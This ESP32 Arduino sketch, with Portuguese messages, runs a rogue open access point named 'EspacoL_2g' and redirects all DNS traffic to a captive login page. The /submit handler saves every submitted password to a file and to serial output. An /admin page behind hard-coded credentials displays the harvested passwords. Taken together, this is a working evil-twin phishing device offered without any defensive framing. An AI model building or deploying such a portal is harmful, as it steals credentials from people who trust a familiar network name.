#include <Arduino.h> //not needed in the arduino ide
#include "FS.h"
#include <LittleFS.h>
#include <time.h>
#include "page.h"

#define FORMAT_LITTLEFS_IF_FAILED true

// Captive Portal
#include <AsyncTCP.h> //https://github.com/me-no-dev/AsyncTCP using the latest dev version from @me-no-dev
#include <DNSServer.h>
#include <ESPAsyncWebServer.h> //https://github.com/me-no-dev/ESPAsyncWebServer using the latest dev version from @me-no-dev
#include <esp_wifi.h>		   //Used for mpdu_rx_disable android workaround

// Pre reading on the fundamentals of captive portals https://textslashplain.com/2022/06/24/captive-portals/
const char* admin_username = "igor";
const char* admin_password = "1207";

const char *ssid = "EspacoL_2g"; // FYI The SSID can't have a space in it.
// const char * password = "12345678"; //Atleast 8 chars
const char *password = NULL; // no password

#define MAX_CLIENTS 4  // ESP32 supports up to 10 but I have not tested it yet
#define WIFI_CHANNEL 6 // 2.4ghz channel 6 https://en.wikipedia.org/wiki/List_of_WLAN_channels#2.4_GHz_(802.11b/g/n/ax)

const IPAddress localIP(4, 3, 2, 1);		  // the IP address the web server, Samsung requires the IP to be in public space
const IPAddress gatewayIP(4, 3, 2, 1);		  // IP address of the network should be the same as the local IP for captive portals
const IPAddress subnetMask(255, 255, 255, 0); // no need to change: https://avinetworks.com/glossary/subnet-mask/

const String localIPURL = "http://4.3.2.1"; // a string version of the local IP with http, used for redirecting clients to your webpage

DNSServer dnsServer;
AsyncWebServer server(80);


void listDir(fs::FS &fs, const char * dirname, uint8_t levels){
    Serial.printf("Listing directory: %s\r\n", dirname);

    File root = fs.open(dirname);
    if(!root){
        Serial.println("- failed to open directory");
        return;
    }
    if(!root.isDirectory()){
        Serial.println(" - not a directory");
        return;
    }

    File file = root.openNextFile();
    while(file){
        if(file.isDirectory()){
            Serial.print("  DIR : ");

            Serial.print(file.name());
            time_t t= file.getLastWrite();
            struct tm * tmstruct = localtime(&t);
            Serial.printf("  LAST WRITE: %d-%02d-%02d %02d:%02d:%02d\n",(tmstruct->tm_year)+1900,( tmstruct->tm_mon)+1, tmstruct->tm_mday,tmstruct->tm_hour , tmstruct->tm_min, tmstruct->tm_sec);

            if(levels){
                listDir(fs, file.name(), levels -1);
            }
        } else {
            Serial.print("  FILE: ");
            Serial.print(file.name());
            Serial.print("  SIZE: ");

            Serial.print(file.size());
            time_t t= file.getLastWrite();
            struct tm * tmstruct = localtime(&t);
            Serial.printf("  LAST WRITE: %d-%02d-%02d %02d:%02d:%02d\n",(tmstruct->tm_year)+1900,( tmstruct->tm_mon)+1, tmstruct->tm_mday,tmstruct->tm_hour , tmstruct->tm_min, tmstruct->tm_sec);
        }
        file = root.openNextFile();
    }
}

void appendFile(fs::FS &fs, const char * path, const char * message){
    Serial.printf("Appending to file: %s\r\n", path);

    File file = fs.open(path, FILE_APPEND);
    if(!file){
        Serial.println("- failed to open file for appending");
        return;
    }
    if(file.print(message)){
        Serial.println("- message appended");
    } else {
        Serial.println("- append failed");
    }
    file.close();
}

void readFile(fs::FS &fs, const char * path){
    Serial.printf("Reading file: %s\r\n", path);

    File file = fs.open(path);
    if(!file || file.isDirectory()){
        Serial.println("- failed to open file for reading");
        return ;
    }

    Serial.println("- read from file:");
    while(file.available()){
        Serial.write(file.read());
    }
    file.close();
}

void deleteFile(fs::FS &fs, const char *path) {
  Serial.printf("Deleting file: %s\r\n", path);
  if (fs.remove(path)) {
    Serial.println("- file deleted");
  } else {
    Serial.println("- delete failed");
  }
}

void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP)
{
	// Define the DNS interval in milliseconds between processing DNS requests
	#define DNS_INTERVAL 30

	// Set the TTL for DNS response and start the DNS server
	dnsServer.setTTL(3600);
	dnsServer.start(53, "*", localIP);
}

void startSoftAccessPoint(const char *ssid, const char *password, const IPAddress &localIP, const IPAddress &gatewayIP)
{
	// Define the maximum number of clients that can connect to the server
	#define MAX_CLIENTS 4
	// Define the WiFi channel to be used (channel 6 in this case)
	#define WIFI_CHANNEL 6

	// Set the WiFi mode to access point and station
	esp_wifi_set_max_tx_power(78);
	WiFi.mode(WIFI_MODE_AP);
	

	// Define the subnet mask for the WiFi network
	const IPAddress subnetMask(255, 255, 255, 0);

	// Configure the soft access point with a specific IP and subnet mask
	WiFi.softAPConfig(localIP, gatewayIP, subnetMask);

	// Start the soft access point with the given ssid, password, channel, max number of clients
	WiFi.softAP(ssid, password, WIFI_CHANNEL, 0, MAX_CLIENTS);

	// Disable AMPDU RX on the ESP32 WiFi to fix a bug on Android
	esp_wifi_stop();
	esp_wifi_deinit();
	wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
	my_config.ampdu_rx_enable = false;
	esp_wifi_init(&my_config);
	esp_wifi_start();
	vTaskDelay(100 / portTICK_PERIOD_MS); // Add a small delay
}

void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP)
{
/* 

	//======================== Webserver ========================
	// WARNING IOS (and maybe macos) WILL NOT POP UP IF IT CONTAINS THE WORD "Success" https://www.esp8266.com/viewtopic.php?f=34&t=4398
	// SAFARI (IOS) IS STUPID, G-ZIPPED FILES CAN'T END IN .GZ https://github.com/homieiot/homie-esp8266/issues/476 this is fixed by the webserver serve static function.
	// SAFARI (IOS) there is a 128KB limit to the size of the HTML. The HTML can reference external resources/images that bring the total over 128KB
	// SAFARI (IOS) popup browser has some severe limitations (javascript disabled, cookies disabled)

	// Required
	server.on("/connecttest.txt", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);
	}); // windows 11 captive portal workaround

	server.on("/wpad.dat", [](AsyncWebServerRequest *request){
		request->send(404);
	}); // Honestly don't understand what this is but a 404 stops win 10 keep calling this repeatedly and panicking the esp32 :)

	// Background responses: Probably not all are Required, but some are. Others might speed things up?
	// A Tier (commonly used by modern systems)
	server.on("/generate_204", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);
	}); // android captive portal redirect

	server.on("/redirect", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);	
	}); // microsoft redirect

	server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);	
	}); // apple call home

	server.on("/canonical.html", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);
	}); // firefox captive portal call home

	server.on("/success.txt", [](AsyncWebServerRequest *request){
		request->send(200);
	}); // firefox captive portal call home

	server.on("/ncsi.txt", [](AsyncWebServerRequest *request){
		request->redirect(localIPURL);
	}); // windows call home

	// B Tier (uncommon)
	//  server.on("/chrome-variations/seed",[](AsyncWebServerRequest *request){request->send(200);}); //chrome captive portal call home
	//  server.on("/service/update2/json",[](AsyncWebServerRequest *request){request->send(200);}); //firefox?
	//  server.on("/chat",[](AsyncWebServerRequest *request){request->send(404);}); //No stop asking Whatsapp, there is no internet connection
	//  server.on("/startpage",[](AsyncWebServerRequest *request){request->redirect(localIPURL);});

	// return 404 to webpage icon
	server.on("/favicon.ico", [](AsyncWebServerRequest *request){ 
		request->send(404);
	}); // webpage icon
 */

	// Serve Basic HTML Page
	server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request){
		AsyncWebServerResponse *response = request->beginResponse(200, "text/html", loginPage);
		response->addHeader("Cache-Control", "public,max-age=31536000");  // save this file to cache for 1 year (unless you refresh)
		request->send(response);
		Serial.println("Served Basic HTML Page"); 
	});

	// the catch all
	server.onNotFound([](AsyncWebServerRequest *request){
		request->redirect(localIPURL);
		Serial.print("onnotfound ");
		Serial.print(request->host());	// This gives some insight into whatever was being requested on the serial monitor
		Serial.print(" ");
		Serial.print(request->url());
		Serial.print(" sent redirect to " + localIPURL + "\n"); 
	});

	// Rota para lidar com a submissão do formulário
	server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
		if (request->hasParam("password", true)) {
		String password = request->getParam("password", true)->value();
		File file = LittleFS.open("/password.txt", "a");
		Serial.println("Senha: " + password);

		if (file) {
			file.println(password + "\n\r");
			file.close();
			request->send(200, "text/html", "Senha salva com sucesso. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
		} else {
			request->send(500, "text/html", "Erro ao salvar a senha. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
		}
		} else {
		request->send(400, "text/html", "Senha não fornecida. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
		}
	});

	// Rota para a página de administração
	server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request){
		if (!request->authenticate(admin_username, admin_password)) {
		return request->requestAuthentication();
		}
		if (LittleFS.exists("/password.txt")) {
		File file = LittleFS.open("/password.txt", "r");
		if (file) {
			String passwordContent;
			while (file.available()) {
			passwordContent += (char)file.read();
			}
			file.close();
			String html = "<html><head><meta charset='UTF-8'></head><body><h1>Conteúdo do Arquivo Salvo</h1><pre>" + passwordContent + "</pre></body></html>";
			request->send(200, "text/html", html);
		} else {
			request->send(500, "text/html", "Erro ao abrir o arquivo.");
		}
		} else {
		request->send(404, "text/html", "Arquivo não encontrado.");
		}
	});

	/* server.on("/salvar", HTTP_POST, [](AsyncWebServerRequest *request){
		if (!request->authenticate(admin_username, admin_password)) {
			return request->requestAuthentication();
		}
		if (request->hasParam("ssid", true)){
			String ssid = request->getParam("ssid", true)->value();

			File file = LittleFS.open("/config.txt", "w");
			Serial.println("SSID: " + ssid);

			if (file) {
				file.println(ssid);
				file.close();
				request->send(200, "text/html", "Salvo com sucesso. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
			} else {
				request->send(500, "text/html", "Erro ao salvar. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
			}
		} else {
			request->send(400, "text/html", "Senha não fornecida. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
		}
	});

	server.on("/config", HTTP_GET, [](AsyncWebServerRequest *request){
		if (!request->authenticate(admin_username, admin_password)) {
			return request->requestAuthentication();
		}
		request->send(200, "text/html", configPage);
	}); */
}

void setup()
{
	// Set the transmit buffer size for the Serial object and start it with a baud rate of 115200.
	Serial.setTxBufferSize(1024);
	Serial.begin(115200);

	// Iniciar LittleFS
	if(!LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED)){
        Serial.println("LittleFS Mount Failed");
    }
	listDir(LittleFS, "/", 0);
	//appendFile(LittleFS, "/hello.txt", "World!\r\n");
	// readFile(LittleFS, "/password.txt");
	// deleteFile(LittleFS, "/hello.txt");

	// Wait for the Serial object to become available.
	while (!Serial);

	// Print a welcome message to the Serial port.
	Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__ " by CD_FER"); //__DATE__ is provided by the platformio ide
	Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

	// if (LittleFS.exists("/config.txt")) {
	// 	File file = LittleFS.open("/config.txt", "r");
	// 	if (file) {
	// 		char* fileContent;
	// 		while (file.available()) {
	// 		fileContent += (char)file.read();
	// 		}
	// 		file.close();
	// 		startSoftAccessPoint(fileContent, password, localIP, gatewayIP);
	// 	}
	// } else {
	// 	startSoftAccessPoint(ssid, password, localIP, gatewayIP);
	// }
	startSoftAccessPoint(ssid, password, localIP, gatewayIP);
	setUpDNSServer(dnsServer, localIP);
	setUpWebserver(server, localIP);
	server.begin();

	Serial.print("\n");
	Serial.print("Startup Time:"); // should be somewhere between 270-350 for Generic ESP32 (D0WDQ6 chip, can have a higher startup time on first boot)
	Serial.println(millis());
	Serial.print("\n");
}

void loop()
{
	dnsServer.processNextRequest(); // I call this atleast every 10ms in my other projects (can be higher but I haven't tested it for stability)
	delay(DNS_INTERVAL);			// seems to help with stability, if you are doing other things in the loop this may not be needed
}